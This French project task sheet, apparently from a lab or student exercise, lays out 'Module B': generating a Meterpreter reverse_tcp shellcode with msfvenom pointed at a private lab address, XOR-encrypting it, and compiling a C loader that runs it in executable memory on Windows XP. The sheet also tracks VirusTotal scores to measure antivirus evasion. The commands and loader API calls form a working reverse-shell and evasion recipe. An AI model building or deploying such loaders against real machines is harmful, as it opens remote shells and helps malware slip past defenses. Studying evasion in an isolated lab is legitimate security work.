# Module B — Loader C + XOR

## Responsable
Module B (collègue)

## ⚠️ Cible Windows XP 32 bits
- Payload : windows/meterpreter/reverse_tcp (**PAS** /x64/)
- Shellcode -f c en x86
- Compilation : i686-w64-mingw32-gcc (**PAS** x86_64-w64-mingw32-gcc)

## Prérequis
- Phase 0 validée
- apt install mingw-w64

## Fichiers attendus
- gen_shellcode.sh — msfvenom + XOR → shellcode_enc.h
- loader.c — déchiffrement XOR + exécution
- Makefile — i686-w64-mingw32-gcc
- results_B.md — scores VT
- loader.exe — binaire compilé (poussé pour Module A)

## Commandes
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f c -o shellcode.c
    i686-w64-mingw32-gcc loader.c -o loader.exe -lws2_32

## API loader (XP)
    VirtualAlloc(NULL, size, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(dest, decrypted, size);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dest, NULL, 0, NULL);
    WaitForSingleObject(thread, INFINITE);

## Definition of Done
- [ ] loader.exe ouvre une session Meterpreter sur XP
- [ ] Score VT de loader.exe dans results_B.md
- [ ] loader.exe poussé sur branche GitHub
- [ ] Comparaison avec Phase 0 (52/70)
